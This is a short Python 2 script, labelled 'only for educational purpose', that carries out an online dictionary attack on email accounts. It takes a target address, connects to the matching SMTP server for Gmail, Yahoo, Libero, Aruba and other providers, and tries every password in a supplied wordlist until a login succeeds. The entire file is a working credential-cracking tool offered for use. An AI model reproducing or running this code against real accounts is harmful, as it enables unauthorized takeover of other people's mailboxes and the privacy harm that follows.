

#Software written by Montini Cristian, only for educational purpose.

import smtplib
import os
import sys

MARK = 0

def logo():
	print '''

             | MAIL PHASE |
                            Version 1.0
'''
def main():
	logo()
	try:
		user = raw_input("Type target mail: ")
	
	except IOError:
		print "[!] Check your python version"
		return
	#SMTP server chose:
	if '@libero' in user:
	    smtpserver=smtplib.SMTP("imapmail.libero.it", 587)
	if '@gmail' in user:
	    smtpserver=smtplib.SMTP("smtp.gmail.com", 587)
	if '@ymail' in user:
		smtpserver=smtplib.SMTP("smtp.mail.yahoo.it", 587)
	if '@yahoo' in user:
		smtpserver=smtplib.SMTP("smtp.mail.yahoo.it", 587)
	if '@alice' in user:
		smtpserver=smtplib.SMTP("out.alice.it", 587)
	if '@aruba' in user:
		smtpserver=smtplib.SMTP("smtp.aruba.it", 587)
	if '@virgilio' in user:
		smtpserver=smtplib.SMTP("out.virgilio.it", 587)
	

	smtpserver.ehlo()
	smtpserver.starttls()
	
	passwfile = raw_input("Type dictionary file: ")
	passwfile = open(passwfile, "r")
	i=1
	for password in passwfile:
		os.system("clear")
		print("\n")
		print("[%d]     %s " % (i,password))
		i = i + 1
		try:
			smtpserver.login(user, password)
			os.system("clear")
			print("[!] Password trovata: %s" % password)
			break;

		except smtplib.SMTPAuthenticationError:
			continue;

main()
